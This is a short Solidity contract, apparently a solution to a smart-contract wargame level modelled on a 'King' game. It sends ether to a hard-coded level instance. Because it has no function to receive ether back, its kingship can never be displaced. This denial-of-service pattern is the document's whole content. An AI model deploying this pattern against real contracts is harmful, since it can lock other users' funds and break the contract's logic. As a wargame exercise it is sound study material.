// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Strings.sol";

contract ForeverKing {

    address levelInstance = 0x3bb17fE1eAc1F4E6A061e8440Df520980c10Ebab;

    constructor() {
    }

    function give() public payable {
        (bool sent, ) = levelInstance.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }


    // function claimKingship(address payable _to) public payable {
    //     (bool sent, ) = _to.call{value: msg.value}(abi.encodeWithSignature('receive()'));
    //     require(sent, "Failed to send value!");
    // }

    // function callvalue() 
    //     public view 
    //     returns(string memory) {
        
    //     return abi.encode("{value: }", Strings.toString(msg.value));
    // }
}
